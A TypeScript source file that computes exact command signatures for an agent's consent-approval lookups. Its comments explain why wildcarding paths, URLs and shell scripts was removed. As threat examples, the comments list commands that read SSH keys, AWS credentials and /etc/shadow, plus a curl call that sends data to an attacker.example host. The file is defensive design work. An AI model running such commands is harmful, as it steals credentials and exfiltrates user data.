/**
 * Compute a stable, normalized "command shape" signature from an argv
 * array. Used as the key for first-time consent approval lookups.
 *
 * Algorithm:
 *   - argv[0] is kept verbatim (the executable).
 *   - Every subsequent arg is kept VERBATIM (whitespace-normalized).
 *   - Special case: `bash -c "<script>"` binds to the exact normalized script.
 *
 * Examples:
 *   ["cat", "/Users/g/Downloads/foo.txt"]    → "cat /Users/g/Downloads/foo.txt"
 *   ["ls", "-la", "/Users/g/Downloads"]      → "ls -la /Users/g/Downloads"
 *   ["git", "status"]                        → "git status"
 *   ["curl", "-s", "https://api.x.com/foo"]  → "curl -s https://api.x.com/foo"
 *   ["bash", "-c", "ls | wc -l"]             → "bash -c: ls | wc -l"
 *
 * Ported from the old Cortex automation family (carryover-audit A8); pure, zero-import.
 *
 * DEVIATION 1 (Codex G8, RUN_LOG): the old A8 collapsed EVERY `bash -c <script>` to one shape
 * `bash -c <SCRIPT>`, so approving one benign shell command with "always" silently approved ALL
 * future shell scripts (arbitrary local code execution past the consent gate). A shell script
 * body is arbitrary code — there is no safe "class" to wildcard — so the shape binds to the
 * EXACT normalized script.
 *
 * DEVIATION 2 (Cofre J-7, 2026-07-28): the SAME reasoning finishes the job. `<FILE>`, `<DIR>` and
 * `<URL>` were the identical mistake wearing a narrower mask:
 *
 *   - approving `cat ~/notes.txt` stored `cat <FILE>`, which then matched `cat ~/.ssh/id_rsa`,
 *     `cat ~/.aws/credentials`, `cat /etc/shadow` — every file the granted roots reach;
 *   - approving `curl -s https://api.stripe.com/v1/x` stored `curl -s <URL>`, which then matched
 *     `curl -s https://attacker.example/?d=...` — an approved EXFILTRATION primitive.
 *
 * A path is not a safe class and a URL is even less of one, so there is nothing left to wildcard:
 * the shape is now the exact command. "Approve always" means "always run THIS command", which is
 * also what the consent dialog already showed the user — the old shape silently approved a
 * category the user was never shown.
 *
 * Consequence, deliberately not smoothed over: pre-existing approvals stored in the wildcard form
 * can no longer match anything, and `consent.ts` refuses them explicitly rather than leaving them
 * to match by accident. Users re-approve; over-broad grants do not survive the fix.
 *
 * Privacy note: a stored shape now contains real paths and URLs. That store is owner-scoped and is
 * never model-bound — the shape reaches the consent dialog and the owner's own approvals list, and
 * nothing else. The alternative (keep wildcarding to avoid storing a path) trades the user's
 * private files for the tidiness of the record, which is the wrong way round.
 */
export function computeCommandShape(argv: string[]): string {
  if (argv.length === 0) return '';
  const head = argv[0]!;

  // bash -c / sh -c / zsh -c: the script body IS the command — bind consent to the exact script
  // (whitespace-normalized), never to "any -c script". Extra positional args are appended raw.
  if ((head === 'bash' || head === 'sh' || head === 'zsh') && argv[1] === '-c') {
    const script = (argv[2] ?? '').replace(/\s+/g, ' ').trim();
    const rest = argv.slice(3);
    return `${head} -c: ${script}${rest.length ? ` ${rest.join(' ')}` : ''}`;
  }

  const parts = [head];
  for (let i = 1; i < argv.length; i++) {
    parts.push(normalizeArg(argv[i]!));
  }
  return parts.join(' ');
}

/**
 * Whitespace-normalize an argument and otherwise keep it EXACTLY. See DEVIATION 2 above: there is
 * no argument class that can be safely wildcarded, so this no longer generalises anything. It
 * remains a function because normalization (collapsing internal whitespace so `cat  a.txt` and
 * `cat a.txt` are one shape rather than two prompts) is still worth doing, and because the shape
 * computation is the single place a future generalisation would have to be argued for.
 */
function normalizeArg(arg: string): string {
  return arg.replace(/\s+/g, ' ').trim();
}

/** The placeholders the pre-J-7 shape used. A stored shape containing one is an over-broad legacy
 *  approval: it can never be produced again, and `consent.ts` refuses to match it. */
export const LEGACY_WILDCARDS = ['<FILE>', '<DIR>', '<URL>', '<SCRIPT>'] as const;

/** True when a stored shape came from the pre-J-7 wildcarding scheme. */
export function isLegacyWildcardShape(shape: string): boolean {
  return LEGACY_WILDCARDS.some((w) => shape.includes(w));
}

/**
 * Produce a plain-English description of a command shape, suitable for
 * the consent dialog. Falls back to a generic phrasing when the head
 * isn't recognized.
 */
export function describeCommandShape(shape: string, argv: string[]): string {
  const head = argv[0] ?? '';
  const verbs: Record<string, string> = {
    cat: 'read a file',
    less: 'read a file',
    more: 'read a file',
    head: 'read the start of a file',
    tail: 'read the end of a file',
    ls: 'list a directory',
    find: 'search the filesystem',
    grep: 'search file contents',
    rg: 'search file contents',
    git: 'run a git command',
    npm: 'run an npm command',
    node: 'run a Node.js script',
    python: 'run a Python script',
    python3: 'run a Python script',
    curl: 'make an HTTP request',
    wget: 'download from a URL',
    open: 'open a file or app',
    osascript: 'run an AppleScript',
    pwsh: 'run a PowerShell command',
    powershell: 'run a PowerShell command',
    bash: 'run a shell script',
    sh: 'run a shell script',
    zsh: 'run a shell script',
    rm: 'delete a file',
    mv: 'move or rename a file',
    cp: 'copy a file',
    mkdir: 'create a directory',
    touch: 'create or update a file',
    echo: 'print text',
    awk: 'process text with awk',
    sed: 'edit text with sed',
  };

  const verb = verbs[head];
  void shape;
  if (verb) return `run \`${head}\` to ${verb}`;
  return `run the command \`${head}\``;
}
